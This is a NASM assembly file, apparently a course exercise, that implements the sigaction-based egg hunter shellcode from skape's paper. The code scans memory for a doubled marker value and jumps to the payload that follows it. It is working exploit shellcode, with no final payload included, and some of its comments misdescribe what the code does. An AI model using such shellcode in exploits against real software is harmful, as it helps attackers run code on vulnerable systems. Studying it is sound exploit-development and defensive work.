;Filename: Egg_Hunter.nasm
;Author: MrSquid 
;Purpose: NASM code simulating an Egg Hunter shellcode (obtain from: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
;This example uses the sigaction tecnique shown in the pdf
global _start 

section .text

_start: 

alignment:  
	or cx,0xfff         ; Page alingment

search_shell:  
	inc ecx             ; Increment our page alignment (space "created" where the shellcode will be executed)
	push byte +0x43     ; Sigaction syscall (0x43 = 67 decimal)
	pop eax             ; eax=67
	int 0x80            ; Syscall sigaction

	cmp al,0xf2         ; If al is 242 (0xf2), then there is a sigaction error and egg hunter can not be executed
	jz alignment        ; The code keeps jumping to alignment until the comparison is set to False (searchs the egghunter)
	mov eax, 0x7A6EA1A2 ; Here is the pointer where the egg is saved until the jump is reached
	mov edi, ecx        ; Moves ecx to edi (pointer to the shellcode)
	scasd   	    ; Compares (double word) eax with edi 
	jnz search_shell    ; If it did not match try the next address
	scasd
	jnz search_shell
	jmp edi             ; We found our egg identifier, pass execution

